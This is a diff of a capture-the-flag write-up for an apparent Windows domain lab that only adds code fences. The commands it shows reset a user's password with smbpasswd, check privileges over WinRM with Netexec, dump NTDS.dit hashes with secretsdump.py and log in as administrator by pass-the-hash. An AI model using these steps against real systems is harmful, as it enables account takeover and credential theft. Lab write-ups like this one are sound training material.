@@ -73,9 +73,9 @@ The password was reset to Password123 using:
 smbpasswd -r 10.10.126.10 -U caroline.robinson 
 ```
 Access was verified, and user privileges were checked using Netexec and the whoami /priv command:
-
+```
 nxc winrm 10.10.126.10 -u caroline.robinson -p "Password123" -X "whoami /priv" 
-
+```
 ![i](Images/20241213061303.png)
 
 The SeBackupPrivilege was identified, enabling access to sensitive files.
@@ -124,7 +124,7 @@ secretsdump.py -ntds ntds.dit -system system.hive LOCAL
 ![i](Images/20241213062005.png)
 
 Using the NT hash for the administrator account, final access was gained, and the last flag retrieved:
-
- nxc winrm 10.10.126.10 -u administrator -H hash -X "cat C:\Users\Administrator\Desktop\root.txt"
- 
+```
+nxc winrm 10.10.126.10 -u administrator -H hash -X "cat C:\Users\Administrator\Desktop\root.txt"
+```
 ![i](Images/20241213062049.png)
